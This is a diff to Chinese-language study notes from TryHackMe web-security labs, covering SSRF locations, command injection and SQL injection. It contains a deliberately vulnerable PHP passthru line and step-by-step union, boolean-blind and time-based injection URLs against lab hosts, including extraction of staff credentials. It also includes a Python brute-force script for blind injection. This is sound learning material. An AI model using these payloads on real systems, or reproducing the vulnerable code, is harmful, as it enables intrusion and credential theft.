@@ -251,17 +251,13 @@
   - 可以通过许多不同的方式在 Web 应用程序中发现潜在的 SSRF 漏洞。
   - 四个常见位置的示例
     - 在URL中使用完整的URL时
-
-    ![URL SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/956e1914b116cbc9e564e3bb3d9ab50a.png)
+      - `http://website.thm/form?server=http://server.website.thm/store`
     - 表单的隐藏字段
-
-    ![form SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/237696fc8e405d25d4fc7bbcc67919f0.png)
+      - `<input type="hidden" name="server" value="http://server.website.thm/store">`
     - 部分 URL，例如主机名
-
-    ![server SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f3c387849e91a4f15a7b59ff7324be75.png)
+      - `http://website.thm/form?server=api`
     - 只是路径
-
-    ![path SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3fd583950617f7a3713a107fcb4cfa49.png)
+      - `http://website.thm/form?dst=/forms/contact`
 - SSRF防御手段
   - Deny List
     - Web应用程序可以使用该手段来保护敏感端点、IP 地址或域不被公众访问，同时仍然允许访问其他位置。
@@ -452,15 +448,143 @@
       ```
     - `Passthru`
     - `System`
+  - 常见过滤
+    - `pattern='[0-9]+'`
+    - [`filter_input`](https://www.php.net/manual/en/function.filter-input.php)
+  - 绕过过滤器
+    - 可以滥用应用程序背后的逻辑来绕过这些过滤器。
+    - 例如，一个应用程序可能去掉引号；我们可以改用它的十六进制值来获得相同的结果。
+- 实践
+  ```php
+    $result = passthru("/bin/ping -c 4 ".$_GET["address"]); 
+  ```
+  - [命令注入常用payload](https://github.com/payloadbox/command-injection-payload-list)
 
+### SQL注入
+- SQL(结构化查询语句)
+  - SELECT
+    - `select * from users;`
+    - `select * from users LIMIT 2,1` # 跳过前两个结果,返回一个结果
+    - `select * from users where username like '%mi%';`
+  - UNION
+    - 此查询的规则
+      - UNION 语句必须在每个 SELECT 语句中检索相同数量的列
+      - 这些列必须具有相似的数据类型并且列顺序必须相同
+      - 注入常用
+        - `select username,pass,info from users where id = 1 union select 1,2,3`
+  - INSERT
+    - `insert into users (username,password) values ('bob','password123');`
+  - UPDATE
+    - `update users SET username='root',password='pass123' where username='admin';`
+- SQL注入
+  - `https://website.thm/blog?id=1`
+    - 后台 `SELECT * from blog where id=1 and private=0 LIMIT 1;`
+    - 构造访问 `https://website.thm/blog?id=2;--`
+    - 后台结果 `SELECT * from blog where id=2;-- and private=0 LIMIT 1;`
+  - 三种类型
+    - In-Band
+    - Blind 
+    - Out Of Band
 
+- In-Band SQLi
+  - Error-Based SQL Injection
+    - 这种类型的 SQL 注入对于轻松获取有关数据库结构的信息最有用，因为来自数据库的错误消息会直接打印到浏览器屏幕。
+    - 这通常可用于枚举整个数据库。
+  - Union-Based SQL Injection
+    - 这种类型的注入利用 SQL UNION 运算符和 SELECT 语句将其他结果返回到页面。
+    - 此方法是通过 SQL 注入漏洞提取大量数据的最常用方法。
+  - 实践
+    - URL:`https://website.thm/article?id=1`
+    - 后台php `select * from article where id = 1`
+    - 第一步 
+      - 构造URL `https://website.thm/article?id=1'`
+      - 发现返回错误信息，证明存在漏洞
+    - 第二步
+      - 使后台返回的是数据而不是错误信息
+      - 构造URL `https://website.thm/article?id=1 union select 1`,返回错误
+      - 构造URL `https://website.thm/article?id=1 union select 1,2`,返回错误
+      - 构造URL `https://website.thm/article?id=1 union select 1,2,3`,返回正常数据
+      - 构造URL `https://website.thm/article?id=0 union select 1,2,3`,使返回结果只为 `1 2 3`,使可以开始使用这些返回值来检索更有用的信息
+    - 第三步
+      - 构造URL `https://website.thm/article?id=0 union select 1,2,database()` 得到数据库名称 `sqli_one`
+      - 构造URL `https://website.thm/article?id=0 union select 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`  得到表名 `article` 和 `staff_users`
+        - `group_concat()` 从多个返回的行中获取指定的列（例子中是 table_name）
+        - `information_schema`,数据库的每个用户都可以访问它,它包含有关用户有权访问的所有数据库和表的信息
+        - `table_schema`
+      - 构造URL `https://website.thm/article?id=0 union select 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`  得到列名 `id` `password` 和 `username`
+        - 检索的信息已从 table_name 更改为 column_name
+        - information_schema 数据库中查询的表已从 tables 更改为 columns
+        - 正在搜索 table_name 列的值为 staff_users的所有行
+      - 构造URL `https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
+        - `SEPARATOR` 分隔符
 
+- Blind SQLi - Authentication Bypass(身份认证绕过)
+  - `select * from users where username='' and password='' OR 1=1;`
+- Blind SQLi - Boolean Based(基于布尔)
+  - 基于布尔的 SQL 注入是指我们从注入尝试中收到的响应
+    - 它可能是真/假、是/否、开/关、1/0 或任何只能有两个结果的响应
+  - 该结果向我们确认了我们的 SQL 注入负载是否成功
+  - 在第一次检查时，您可能会觉得这种有限的回答无法提供太多信息
+  - 尽管如此，实际上，仅通过这两个响应，就可以枚举整个数据库结构和内容
+  - 实践
+    - 第一步
+      - 访问URL`https://website.thm/checkuser?username=admin`,发现返回值 `true` 
+      - 构造URL`https://website.thm/checkuser?username=admin123`,发现返回值`false`
+    - 第二步
+      - 使后台返回的是`true`
+      - 构造URL `https://website.thm/checkuser?username=admin123 union select 1`,返回`false`
+      - 构造URL `https://website.thm/checkuser?username=admin123 union select 1,2`,返回`false`
+      - 构造URL `https://website.thm/checkuser?username=admin123 union select 1,2,3`,返回`true` 
+    - 第三步
+      - 查询数据库名，得到数据库`sqli_three`
+      ```python
+      import requests
+      import json
+      char = [chr(i) for i in range(97,123)]
+      char.append('_')
+      sql_name = ''
+      flag = 1
+      while flag == 1:
+        for i in char:
+          url = "http://ip/run"
+          sql = "select * from users where username = 'admin123' union select 1,2,3 where database() like '" + sql_name + i +"%';-- LIMIT "
+          payload = {"level":"3","sql":sql}
+          info = requests.post(url,data=payload)
+          if json.loads(info.text)['message'] == 'true':
+            sql_name += i
+            flag = 1
+            print(sql_name)
+            break
+          else:
+            flag = 0
+      ```
+    - 第四步
+      - 查询表名，得到表名`users`
+      - 核心代码 `sql = select * from users where username = 'admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`
+    - 第五步
+      - 查询列名，得到列名`id` `username` `password`
+      - 核心代码1 `sql = select * from users where username = 'admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`
+      - 核心代码2 `sql = select * from users where username = 'admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`
+    - 第六步
+      - 查询用户名
+      - 核心代码 `sql = select * from users where username = 'admin123' UNION SELECT 1,2,3 from users where username like 'a%`
+    - 第七步
+      - 爆破密码
+      - 核心代码 `sql = select * from users where username = 'admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%'`
+- Blind SQLi - Time Based(基于时间)
+  - 大致思路和基于布尔的注入类似
+  - 在UNION 语句中引入`SLEEP()`方法。`SLEEP()` 方法只会在 UNION SELECT 语句成功时执行。 
+    - 构造URL `https://website.thm/checkuser?username=admin123 union select sleep(5)`, 未有延时
+    - 构造URL `https://website.thm/checkuser?username=admin123 union select 1,sleep(5)`, 延时5s，证明查询成功
+  - 步骤和基于布尔的类似。
 
+- Out-of-Band SQLi
+  - 不太常见。
+- SQLi防范
+  - 参数化查询
+  - 用户输入验证
+  - 转义用户输入
 
-
-
-
-
-
-
-
+## Burp Suite
+### Burp Suite: The Basics
+- 
